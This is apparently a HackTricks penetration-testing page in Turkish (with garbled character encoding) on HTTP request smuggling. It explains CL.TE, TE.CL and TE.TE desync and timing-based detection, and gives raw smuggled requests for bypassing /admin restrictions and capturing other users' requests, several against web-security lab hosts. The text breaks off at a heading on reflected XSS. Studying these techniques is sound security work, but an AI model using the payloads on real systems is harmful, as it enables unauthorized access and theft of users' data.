# HTTP Ä°stek KaÃ§Ä±rma / HTTP Desenk AtaÄŸÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na (https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nleri**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek HackTricks** (https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Nedir

Bu zayÄ±flÄ±k, **Ã¶n uÃ§ proxy'ler** ile **arka uÃ§** sunucu arasÄ±ndaki **desenkronizasyon** nedeniyle bir **saldÄ±rganÄ±n** bir HTTP **istek**i gÃ¶ndermesine olanak tanÄ±r. Bu istek, **Ã¶n uÃ§** proxy'ler (yÃ¼k dengeleyici/ters proxy) tarafÄ±ndan **tek bir istek** olarak **yorumlanacak** ve **arka uÃ§** sunucu tarafÄ±ndan **2 istek** olarak **yorumlanacak** ÅŸekilde **gÃ¶nderilir**.

### Teori

[**RFC Belirtimi (2161)**](https://tools.ietf.org/html/rfc2616)

> Bir mesaj, hem Bir Transfer-Encoding baÅŸlÄ±k alanÄ± hem de Bir Content-Length baÅŸlÄ±k alanÄ± ile alÄ±nÄ±rsa, ikincisi YOK SAYILMALIDIR.

**Content-Length**

> Content-Length varlÄ±k baÅŸlÄ±ÄŸÄ±, alÄ±cÄ±ya gÃ¶nderilen varlÄ±k gÃ¶vdesinin bayt cinsinden boyutunu belirtir.

**Transfer-Encoding: chunked**

> Transfer-Encoding baÅŸlÄ±ÄŸÄ±, yÃ¼kÃ¼ gÃ¼venli bir ÅŸekilde kullanÄ±cÄ±ya aktarmak iÃ§in kullanÄ±lan kodlama biÃ§imini belirtir.\
> Chunked, bÃ¼yÃ¼k verilerin bir dizi parÃ§ada gÃ¶nderildiÄŸi anlamÄ±na gelir

### GerÃ§eklik

**Ã–n UÃ§** (yÃ¼k dengeleyici / Ters Proxy) _**content-length**_ veya _**transfer-encoding**_ baÅŸlÄ±ÄŸÄ±nÄ± iÅŸlerken **Arka UÃ§** sunucu **diÄŸerini iÅŸler** ve bu da 2 sistem arasÄ±nda bir **desenkronizasyona** neden olur.\
Bu, bir saldÄ±rganÄ±n, ters proxy'ye gÃ¶nderilen bir isteÄŸi **arka uÃ§** sunucuya **2 farklÄ± istek** olarak **yorumlayabilmesine** olanak tanÄ±r. Bu teknikteki **tehlike**, **arka uÃ§** sunucunun **enjekte edilen 2. isteÄŸi** sanki **sonraki istemciden geldi** gibi **yorumlayacak** olmasÄ± ve o istemcinin **gerÃ§ek isteÄŸinin** enjekte edilen isteÄŸin bir **parÃ§asÄ±** olmasÄ±dÄ±r.

### Ã–zellikler

HTTP'de **bir yeni satÄ±r karakterinin 2 bayttan oluÅŸtuÄŸunu** unutmayÄ±n:

* **Content-Length**: Bu baÅŸlÄ±k, isteÄŸin **gÃ¶vdesinin** bayt cinsinden **boyutunu** belirtmek iÃ§in **ondalÄ±k sayÄ±** kullanÄ±r. GÃ¶vde, son karakterde **bitmesi beklenir, isteÄŸin sonunda yeni bir satÄ±ra gerek yoktur**.
* **Transfer-Encoding:** Bu baÅŸlÄ±k, **bir sonraki parÃ§anÄ±n** **bayt sayÄ±sÄ±nÄ±** belirtmek iÃ§in **hexadecimal sayÄ±** kullanÄ±r. **ParÃ§a**, bir **yeni satÄ±r** ile **bitmelidir** ancak bu yeni satÄ±r **uzunluk gÃ¶stergesi tarafÄ±ndan sayÄ±lmaz**. Bu aktarÄ±m yÃ¶ntemi, **0 boyutunda bir parÃ§a ile biten 2 yeni satÄ±rÄ± takip etmelidir**: `0`
* **Connection**: Deneyimime dayanarak, Ä°stek KaÃ§Ä±rma'nÄ±n ilk isteÄŸinde **`Connection: keep-alive`** kullanÄ±lmasÄ± Ã¶nerilir.

## Temel Ã–rnekler

{% hint style="success" %}
Bu saldÄ±rÄ±yÄ± Burp Suite ile **denemeye Ã§alÄ±ÅŸÄ±rken**, tekrarlayÄ±cÄ±da **`Ä°Ã§eriÄŸi GÃ¼ncelle` ve `HTTP/1 satÄ±r sonlarÄ±nÄ± Normalize Et`** seÃ§eneklerini devre dÄ±ÅŸÄ± bÄ±rakÄ±n Ã§Ã¼nkÃ¼ bazÄ± cihazlar yeni satÄ±rlarÄ±, taÅŸÄ±ma dÃ¶nÃ¼ÅŸlerini ve hatalÄ± iÃ§erik uzunluklarÄ±nÄ± kÃ¶tÃ¼ye kullanÄ±r.
{% endhint %}

HTTP istek kaÃ§Ä±rma saldÄ±rÄ±larÄ±, Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±n `Content-Length` (CL) ve `Transfer-Encoding` (TE) baÅŸlÄ±klarÄ±nÄ± nasÄ±l yorumladÄ±ÄŸÄ±ndaki farklÄ±lÄ±klardan yararlanan belirsiz istekler gÃ¶nderilerek oluÅŸturulur. Bu saldÄ±rÄ±lar, baÅŸlÄ±klarÄ± Ã¶nceliklendiren Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±n bu farklÄ±lÄ±klarÄ± nasÄ±l iÅŸlediÄŸine baÄŸlÄ± olarak **CL.TE**, **TE.CL** ve **TE.TE** ÅŸeklinde ortaya Ã§Ä±kabilir. Her tÃ¼r, sunucularÄ±n aynÄ± isteÄŸi farklÄ± ÅŸekillerde iÅŸlemesinden kaynaklanan, beklenmeyen ve potansiyel olarak kÃ¶tÃ¼ amaÃ§lÄ± sonuÃ§lara yol aÃ§an zayÄ±flÄ±klarÄ± temsil eder.

### ZayÄ±flÄ±k TÃ¼rlerinin Temel Ã–rnekleri

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE ZayÄ±flÄ±ÄŸÄ± (Ã–n UÃ§ tarafÄ±ndan Content-Length kullanÄ±lÄ±rken, Arka UÃ§ tarafÄ±ndan Transfer-Encoding kullanÄ±lÄ±r)

* **Ã–n UÃ§ (CL):** Ä°steÄŸi `Content-Length` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* **Arka UÃ§ (TE):** Ä°steÄŸi `Transfer-Encoding` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* **SaldÄ±rÄ± Senaryosu:**
* SaldÄ±rgan, `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸeri gerÃ§ek iÃ§erik uzunluÄŸuyla eÅŸleÅŸmeyen bir istek gÃ¶nderir.
* Ã–n uÃ§ sunucu, `Content-Length` deÄŸerine dayanarak tÃ¼m isteÄŸi arka uca iletir.
* Arka uÃ§ sunucu, `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ± nedeniyle isteÄŸi parÃ§alÄ± olarak iÅŸler ve kalan verileri ayrÄ±, sonraki bir istek olarak yorumlar.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL ZayÄ±flÄ±ÄŸÄ± (Ã–n UÃ§ tarafÄ±ndan Transfer-Encoding kullanÄ±lÄ±rken, Arka UÃ§ tarafÄ±ndan Content-Length kullanÄ±lÄ±r)

* **Ã–n UÃ§ (TE):** Ä°steÄŸi `Transfer-Encoding` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* **Arka UÃ§ (CL):** Ä°steÄŸi `Content-Length` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* **SaldÄ±rÄ± Senaryosu:**
* SaldÄ±rgan, parÃ§alÄ± bir istek gÃ¶nderir, burada parÃ§a boyutu (`7b`) ve gerÃ§ek iÃ§erik uzunluÄŸu (`Content-Length: 4`) hizalanmaz.
* Ã–n uÃ§ sunucu, `Transfer-Encoding`i onaylayarak tÃ¼m isteÄŸi arka uca iletir.
* Arka uÃ§ sunucu, `Content-Length`i saygÄ± gÃ¶stererek, isteÄŸin yalnÄ±zca baÅŸlangÄ±Ã§ kÄ±smÄ±nÄ± (`7b` bayt) iÅŸler ve geri kalanÄ± istenmeyen bir sonraki isteÄŸin bir parÃ§asÄ± olarak bÄ±rakÄ±r.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: zafiyetli-web sitesi.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE Zafiyeti (Her ikisi de tarafÄ±ndan kullanÄ±lan Transfer-Encoding ile obfuskasyon)

* **Sunucular:** Her ikisi de `Transfer-Encoding`i destekler, ancak obfuskasyon aracÄ±lÄ±ÄŸÄ±yla birinin bunu gÃ¶rmezden gelmesi saÄŸlanabilir.
* **SaldÄ±rÄ± Senaryosu:**
* SaldÄ±rgan, obfuskasyonlu `Transfer-Encoding` baÅŸlÄ±klarÄ±nÄ± iÃ§eren bir istek gÃ¶nderir.
* Obfuskasyonun hangi sunucunun (Ã¶n uÃ§ veya arka uÃ§) tanÄ±yamadÄ±ÄŸÄ±na baÄŸlÄ± olarak CL.TE veya TE.CL zafiyeti sÃ¶mÃ¼rÃ¼lebilir.
* Bir sunucu tarafÄ±ndan gÃ¶rÃ¼len iÅŸlenmemiÅŸ isteÄŸin bir sonraki isteÄŸin bir parÃ§asÄ± haline gelmesi, smuggling'e yol aÃ§ar.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Senaryosu (Her Ä°ki Ã–n UÃ§ ve Arka UÃ§ TarafÄ±ndan KullanÄ±lan Content-Length):**

* Her iki sunucu da isteÄŸi yalnÄ±zca `Content-Length` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
* Bu senaryo genellikle smuggling'e yol aÃ§maz, Ã§Ã¼nkÃ¼ her iki sunucunun isteÄŸin uzunluÄŸunu nasÄ±l yorumladÄ±ÄŸÄ± konusunda uyum vardÄ±r.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Ä°stek
```

#### **CL != 0 Senaryosu:**

* `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ±n var olduÄŸu ve sÄ±fÄ±r olmayan bir deÄŸere sahip olduÄŸu senaryolarÄ± ifade eder, bu da istek gÃ¶vdesinin iÃ§eriÄŸe sahip olduÄŸunu gÃ¶sterir.
* Smuggling saldÄ±rÄ±larÄ±nÄ± anlamak ve oluÅŸturmak iÃ§in Ã¶nemlidir, Ã§Ã¼nkÃ¼ sunucularÄ±n bir isteÄŸin sonunu nasÄ±l belirlediÄŸini etkiler.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

BoÅŸ Olmayan GÃ¶vde
```

#### Hop-by-hop baÅŸlÄ±klar aracÄ±lÄ±ÄŸÄ±yla zorlama

Hop-by-hop baÅŸlÄ±klarÄ± kÃ¶tÃ¼ye kullanarak proxy'e **Content-Length veya Transfer-Encoding baÅŸlÄ±ÄŸÄ±nÄ± silmesi iÃ§in iÅŸaret edebilir ve bÃ¶ylece bir HTTP isteÄŸi smuggling saldÄ±rÄ±sÄ±nÄ±n kÃ¶tÃ¼ye kullanÄ±lmasÄ±nÄ± mÃ¼mkÃ¼n kÄ±labilirsiniz**.
```
Connection: Content-Length
```
**Hop-by-hop baÅŸlÄ±klar hakkÄ±nda daha fazla bilgi iÃ§in** ziyaret edin:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## HTTP Ä°stek KaÃ§Ä±rma Bulma

HTTP istek kaÃ§Ä±rma aÃ§Ä±klarÄ±nÄ± belirlemek genellikle sunucunun manipÃ¼le edilmiÅŸ isteklere yanÄ±t vermesi ne kadar sÃ¼rdÃ¼ÄŸÃ¼nÃ¼ gÃ¶zlemleyen zamanlama teknikleri kullanÄ±larak baÅŸarÄ±labilir. Bu teknikler Ã¶zellikle CL.TE ve TE.CL aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in kullanÄ±ÅŸlÄ±dÄ±r. Bu yÃ¶ntemlerin yanÄ± sÄ±ra, bu tÃ¼r aÃ§Ä±klarÄ± bulmak iÃ§in kullanÄ±labilecek diÄŸer stratejiler ve araÃ§lar bulunmaktadÄ±r:

### Zamanlama Teknikleri Kullanarak CL.TE AÃ§Ä±klarÄ±nÄ± Bulma

* **YÃ¶ntem:**
* Uygulama aÃ§Ä±ksa, sunucunun ek verileri beklemesine neden olacak bir istek gÃ¶nderin.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **GÃ¶zlem:**
* Ã–n uÃ§ sunucusu isteÄŸi `Content-Length`'e gÃ¶re iÅŸler ve mesajÄ± erken keser.
* Beklenen bir parÃ§alÄ± mesaj olan arka uÃ§ sunucu, hiÃ§ gelmeyen bir sonraki parÃ§ayÄ± beklerken gecikmeye neden olur.
* **Belirtiler:**
* YanÄ±tta zaman aÅŸÄ±mÄ± veya uzun gecikmeler.
* Arka uÃ§ sunucudan 400 Bad Request hatasÄ± almak, bazen detaylÄ± sunucu bilgileriyle birlikte.

### Zamanlama Teknikleri Kullanarak TE.CL AÃ§Ä±klarÄ±nÄ± Bulma

* **YÃ¶ntem:**
* Uygulama aÃ§Ä±ksa, sunucunun ek verileri beklemesine neden olacak bir istek gÃ¶nderin.
*   **Ã–rnek:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **GÃ¶zlem:**
* Ã–n uÃ§ sunucusu isteÄŸi `Transfer-Encoding`'e gÃ¶re iÅŸler ve tÃ¼m mesajÄ± iletilir.
* Beklenen bir mesaj olan arka uÃ§ sunucu, hiÃ§ gelmeyen ek verileri beklerken gecikmeye neden olur.

### AÃ§Ä±klarÄ± Bulmak Ä°Ã§in DiÄŸer YÃ¶ntemler

* **FarklÄ± YanÄ±t Analizi:**
* Bir isteÄŸin hafif deÄŸiÅŸik versiyonlarÄ±nÄ± gÃ¶nderin ve sunucu yanÄ±tlarÄ±nÄ±n beklenmedik bir ÅŸekilde farklÄ±laÅŸÄ±p farklÄ±laÅŸmadÄ±ÄŸÄ±nÄ± gÃ¶zlemleyin, bu da bir ayrÄ±ÅŸtÄ±rma uyumsuzluÄŸunu gÃ¶sterebilir.
* **Otomatik AraÃ§lar Kullanma:**
* Burp Suite'in 'HTTP Request Smuggler' uzantÄ±sÄ± gibi araÃ§lar, Ã§eÅŸitli belirsiz istekler gÃ¶ndererek ve yanÄ±tlarÄ± analiz ederek bu aÃ§Ä±klarÄ± otomatik olarak test edebilir.
* **Content-Length FarklÄ±lÄ±k Testleri:**
* GerÃ§ek iÃ§erik uzunluÄŸuyla uyumlu olmayan deÄŸiÅŸen `Content-Length` deÄŸerleriyle istekler gÃ¶nderin ve sunucunun bu tÃ¼r uyumsuzluklarÄ± nasÄ±l iÅŸlediÄŸini gÃ¶zlemleyin.
* **Transfer-Encoding FarklÄ±lÄ±k Testleri:**
* KarÄ±ÅŸÄ±k veya hatalÄ± `Transfer-Encoding` baÅŸlÄ±klarÄ± iÃ§eren istekler gÃ¶nderin ve Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±nÄ±n bu manipÃ¼lasyonlara nasÄ±l farklÄ± yanÄ±t verdiÄŸini izleyin.

### HTTP Ä°stek KaÃ§Ä±rma AÃ§Ä±ÄŸÄ± Test Etme

Zamanlama tekniklerinin etkinliÄŸini doÄŸruladÄ±ktan sonra, istemci isteklerinin manipÃ¼le edilip edilemeyeceÄŸini doÄŸrulamak Ã§ok Ã¶nemlidir. Basit bir yÃ¶ntem, Ã¶rneÄŸin, `/`'ye bir istek yaparak 404 yanÄ±tÄ± almayÄ± denemektir. [Temel Ã–rnekler](./#basic-examples) bÃ¶lÃ¼mÃ¼nde Ã¶nceki `CL.TE` ve `TE.CL` Ã¶rnekleri, istemcinin farklÄ± bir kaynaÄŸa eriÅŸmeyi amaÃ§lasa da 404 yanÄ±tÄ± almak iÃ§in istemci isteÄŸini nasÄ±l zehirleyeceÄŸinizi gÃ¶stermektedir.

**Ana DÃ¼ÅŸÃ¼nceler**

DiÄŸer isteklerle mÃ¼dahale ederek istek kaÃ§Ä±rma aÃ§Ä±klarÄ±nÄ± test ederken aklÄ±nÄ±zda bulundurmanÄ±z gerekenler:

* **FarklÄ± AÄŸ BaÄŸlantÄ±larÄ±:** "SaldÄ±rÄ±" ve "normal" istekler ayrÄ± aÄŸ baÄŸlantÄ±larÄ± Ã¼zerinden gÃ¶nderilmelidir. Her ikisi iÃ§in aynÄ± baÄŸlantÄ±yÄ± kullanmak, aÃ§Ä±ÄŸÄ±n varlÄ±ÄŸÄ±nÄ± doÄŸrulamaz.
* **TutarlÄ± URL ve Parametreler:** Her iki istek iÃ§in aynÄ± URL'leri ve parametre adlarÄ±nÄ± kullanmaya Ã§alÄ±ÅŸÄ±n. Modern uygulamalar genellikle URL ve parametrelere gÃ¶re belirli arka uÃ§ sunuculara istek yÃ¶nlendirir. Bu eÅŸleÅŸmeler, her iki isteÄŸin aynÄ± sunucu tarafÄ±ndan iÅŸlenme olasÄ±lÄ±ÄŸÄ±nÄ± artÄ±rÄ±r, baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in gereklidir.
* **Zamanlama ve YarÄ±ÅŸ KoÅŸullarÄ±:** "Normal" istek, "saldÄ±rÄ±" isteÄŸinden gelen mÃ¼dahaleyi tespit etmeyi amaÃ§lar ve diÄŸer eÅŸzamanlÄ± uygulama istekleriyle rekabet eder. Bu nedenle, "normal" isteÄŸi "saldÄ±rÄ±" isteÄŸinden hemen sonra gÃ¶nderin. YoÄŸun uygulamalar, kesin bir aÃ§Ä±k doÄŸrulamasÄ± iÃ§in birden fazla deneme gerektirebilir.
* **YÃ¼k Dengeleme ZorluklarÄ±:** YÃ¼k dengeleyici olarak hareket eden Ã¶n uÃ§ sunucular, istekleri Ã§eÅŸitli arka uÃ§ sistemlerine daÄŸÄ±tabilir. EÄŸer "saldÄ±rÄ±" ve "normal" istekler farklÄ± sistemlere dÃ¼ÅŸerse, saldÄ±rÄ± baÅŸarÄ±lÄ± olmaz. Bu yÃ¼k dengeleme yÃ¶nÃ¼, bir aÃ§Ä±ÄŸÄ± doÄŸrulamak iÃ§in birkaÃ§ deneme gerektirebilir.
* **Beklenmeyen KullanÄ±cÄ± Etkisi:** SaldÄ±rÄ±nÄ±zÄ±n yanlÄ±ÅŸlÄ±kla baÅŸka bir kullanÄ±cÄ±nÄ±n isteÄŸini etkilediÄŸini (tespit iÃ§in gÃ¶nderdiÄŸiniz "normal" istek olmayan) fark ederseniz, bu saldÄ±rÄ±nÄ±zÄ±n baÅŸka bir uygulama kullanÄ±cÄ±sÄ±nÄ± etkilediÄŸini gÃ¶sterir. SÃ¼rekli testler diÄŸer kullanÄ±cÄ±larÄ± etkileyebilir, bu nedenle dikkatli bir yaklaÅŸÄ±m gerekebilir.

## HTTP Ä°stek KaÃ§Ä±rma KÃ¶tÃ¼ye Kullanma

### Ã–n uÃ§ gÃ¼venlik kontrollerini atlatmak iÃ§in

### HTTP Ä°stek KaÃ§Ä±rma Yoluyla Ã–n UÃ§ GÃ¼venliÄŸini Atlatma

BazÄ± durumlarda, Ã¶n uÃ§ proxy'ler gelen istekleri inceleyerek gÃ¼venlik Ã¶nlemleri uygular. Ancak, bu Ã¶nlemler HTTP Ä°stek KaÃ§Ä±rma'yÄ± kullanarak atlatÄ±labilir, kÄ±sÄ±tlÄ± uÃ§ noktalara izinsiz eriÅŸime olanak tanÄ±r. Ã–rneÄŸin, `/admin`'e eriÅŸim dÄ±ÅŸarÄ±dan engellenmiÅŸ olabilir ve Ã¶n uÃ§ proxy bu tÃ¼r giriÅŸimleri aktif olarak engelleyebilir. Bununla birlikte, bu proxy, kaÃ§Ä±rÄ±lmÄ±ÅŸ bir HTTP isteÄŸi iÃ§inde gÃ¶mÃ¼lÃ¼ istekleri incelemeyi ihmal edebilir, bu da bu kÄ±sÄ±tlamalarÄ± atlamak iÃ§in bir aÃ§Ä±k bÄ±rakÄ±r.

Ã–n uÃ§ gÃ¼venlik kontrollerini atlatmak iÃ§in HTTP Ä°stek KaÃ§Ä±rma'nÄ±n nasÄ±l kullanÄ±labileceÄŸini gÃ¶steren aÅŸaÄŸÄ±daki Ã¶rnekleri dÃ¼ÅŸÃ¼nÃ¼n, Ã¶zellikle genellikle Ã¶n uÃ§ proxy tarafÄ±ndan korunan `/admin` yolunu hedef alanlarÄ±:

**CL.TE Ã–rneÄŸi**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
CL.TE saldÄ±rÄ±sÄ±nda, baÅŸlangÄ±Ã§ isteÄŸi iÃ§in `Content-Length` baÅŸlÄ±ÄŸÄ± kullanÄ±lÄ±rken, ardÄ±ÅŸÄ±k gÃ¶mÃ¼lÃ¼ istek `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ±nÄ± kullanÄ±r. Ã–n uÃ§ proxy'si baÅŸlangÄ±Ã§ `POST` isteÄŸini iÅŸler ancak gÃ¶mÃ¼lÃ¼ `GET /admin` isteÄŸini denetleyemez, bu da `/admin` yoluna izinsiz eriÅŸime izin verir.

**TE.CL Ã–rneÄŸi**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Benzer ÅŸekilde, TE.CL saldÄ±rÄ±sÄ±nda, ilk `POST` isteÄŸi `Transfer-Encoding: chunked` kullanÄ±r ve ardÄ±ÅŸÄ±k gÃ¶mÃ¼lÃ¼ istek, `Content-Length` baÅŸlÄ±ÄŸÄ±na dayalÄ± olarak iÅŸlenir. CL.TE saldÄ±rÄ±sÄ±na benzer ÅŸekilde, Ã¶n uÃ§ proxy, gizlice `/admin` yoluna eriÅŸim saÄŸlayarak, gizlenmiÅŸ `GET /admin` isteÄŸini gÃ¶z ardÄ± eder.

### Ã–n uÃ§ isteÄŸi yeniden yazma ortaya Ã§Ä±karma <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Uygulamalar genellikle gelen istekleri arka uÃ§ sunucuya iletmek Ã¶ncesinde deÄŸiÅŸtirmek iÃ§in bir **Ã¶n uÃ§ sunucusu** kullanÄ±r. Tipik bir deÄŸiÅŸiklik, `X-Forwarded-For: <Ä°stemcinin IP'si>` gibi baÅŸlÄ±klar eklemeyi iÃ§erir, istemcinin IP'sini arka uca iletmek iÃ§in. Bu deÄŸiÅŸikliklerin anlaÅŸÄ±lmasÄ± Ã¶nemli olabilir, Ã§Ã¼nkÃ¼ bu, **korumalarÄ± atlamak** veya **gizlenmiÅŸ bilgileri veya uÃ§ noktalarÄ± ortaya Ã§Ä±karmak** iÃ§in yollarÄ± ortaya Ã§Ä±karabilir.

Bir proxy'nin bir isteÄŸi nasÄ±l deÄŸiÅŸtirdiÄŸini araÅŸtÄ±rmak iÃ§in, arka uÃ§ tarafÄ±ndan yanÄ±tlanan bir POST parametresini bulun. Sonra, bu parametreyi en sona koyarak aÅŸaÄŸÄ±daki gibi benzer bir istek oluÅŸturun:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Bu yapÄ±da, ardÄ±ÅŸÄ±k istek bileÅŸenleri, yanÄ±tta yansÄ±tÄ±lan parametre olan `search=`'den sonra eklenir. Bu yansÄ±ma, ardÄ±ÅŸÄ±k isteÄŸin baÅŸlÄ±klarÄ±nÄ± ortaya Ã§Ä±karacaktÄ±r.

GÃ¶mÃ¼lÃ¼ isteÄŸin `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ± gerÃ§ek iÃ§erik uzunluÄŸuyla hizalamak Ã¶nemlidir. KÃ¼Ã§Ã¼k bir deÄŸerle baÅŸlayÄ±p kademeli olarak artÄ±rmak tavsiye edilir, Ã§Ã¼nkÃ¼ Ã§ok dÃ¼ÅŸÃ¼k bir deÄŸer yansÄ±tÄ±lan verileri kesebilirken, Ã§ok yÃ¼ksek bir deÄŸer isteÄŸin hata vermesine neden olabilir.

Bu teknik aynÄ± zamanda bir TE.CL zafiyeti baÄŸlamÄ±nda da uygulanabilir, ancak istek `search=\r\n0` ile sonlandÄ±rÄ±lmalÄ±dÄ±r. Yeni satÄ±r karakterlerinden baÄŸÄ±msÄ±z olarak, deÄŸerler arama parametresine eklenecektir.

Bu yÃ¶ntem, Ã¶ncelikle Ã¶n uÃ§ proxy tarafÄ±ndan yapÄ±lan istek deÄŸiÅŸikliklerini anlamak iÃ§in hizmet verir, esasen kendi kendine yÃ¶nlendirilen bir araÅŸtÄ±rma gerÃ§ekleÅŸtirir.

### DiÄŸer kullanÄ±cÄ±larÄ±n isteklerini yakalama <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Bir POST iÅŸlemi sÄ±rasÄ±nda bir parametrenin deÄŸeri olarak belirli bir isteÄŸi ekleyerek, bir sonraki kullanÄ±cÄ±nÄ±n isteklerini yakalamak mÃ¼mkÃ¼ndÃ¼r. Ä°ÅŸte bunun nasÄ±l baÅŸarÄ±lacaÄŸÄ±:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Bu senaryoda, **yorum parametresi**, genel olarak eriÅŸilebilir bir sayfadaki bir gÃ¶nderinin yorum bÃ¶lÃ¼mÃ¼ndeki iÃ§eriÄŸi depolamak amacÄ±yla kullanÄ±lÄ±r. Sonraki isteÄŸin iÃ§eriÄŸi bir yorum olarak gÃ¶rÃ¼necektir.

Ancak, bu teknik bazÄ± sÄ±nÄ±rlamalara sahiptir. Genellikle, sadece kaÃ§Ä±rÄ±lan isteÄŸin kullanÄ±lan parametre ayÄ±rÄ±cÄ±sÄ±na kadar olan verileri yakalar. URL kodlu form gÃ¶nderimleri iÃ§in bu ayÄ±rÄ±cÄ±, `&` karakteridir. Bu, kurban kullanÄ±cÄ±nÄ±n isteÄŸinden yakalanan iÃ§eriÄŸin ilk `&` karakterinde duracaÄŸÄ± anlamÄ±na gelir, bu hatta sorgu dizesinin bir parÃ§asÄ± olabilir.

AyrÄ±ca, bu yaklaÅŸÄ±mÄ±n TE.CL zafiyeti ile de mÃ¼mkÃ¼n olduÄŸunu belirtmek Ã¶nemlidir. Bu tÃ¼r durumlarda, istek `search=\r\n0` ile sonuÃ§lanmalÄ±dÄ±r. Yeni satÄ±r karakterlerinden baÄŸÄ±msÄ±z olarak, deÄŸerler arama parametresine eklenecektir.

### YansÄ±tÄ±lan XSS'i sÃ¶mÃ¼rmek iÃ§in HTTP isteÄŸi kaÃ§Ä±rma kullanÄ±mÄ±

